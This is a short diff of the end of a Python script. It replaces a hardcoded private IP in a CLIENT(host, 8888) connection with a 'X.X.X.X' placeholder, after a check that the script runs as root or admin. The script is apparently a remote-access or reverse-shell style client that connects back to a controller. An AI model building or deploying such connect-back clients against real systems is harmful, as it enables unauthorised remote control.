@@ -154,5 +154,5 @@ if __name__ == "__main__":
         print("[-] Error: This script must be run as root/admin.")
         sys.exit(1)
 
-    client = CLIENT('192.168.1.115', 8888)
+    client = CLIENT('X.X.X.X', 8888)
     client.engage()
